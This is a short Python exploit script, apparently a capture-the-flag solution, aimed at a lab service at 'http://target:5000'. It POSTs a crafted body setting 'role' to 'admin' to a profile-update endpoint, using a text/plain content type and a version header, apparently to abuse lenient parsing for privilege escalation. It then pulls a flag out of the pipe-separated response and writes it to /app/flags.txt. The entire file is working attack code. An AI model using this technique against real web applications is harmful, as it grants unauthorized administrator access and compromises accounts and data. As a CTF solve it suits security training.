#!/usr/bin/env python3
from __future__ import annotations

import pathlib
import sys
import urllib.error
import urllib.request


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://target:5000"

    body = '{"role": "admin", "active": True}'
    req = urllib.request.Request(
        base + "/api/profile/update",
        data=body.encode("utf-8"),
        headers={"Content-Type": "text/plain", "X-Profile-Version": "2.1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            text = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", errors="replace")

    parts = text.split("|")
    if len(parts) >= 3:
        flag = parts[2].strip()
        pathlib.Path("/app/flags.txt").write_text(flag + "\n")
        print(flag)
        return 0
    raise SystemExit(f"unexpected response: {text}")


if __name__ == "__main__":
    raise SystemExit(main())
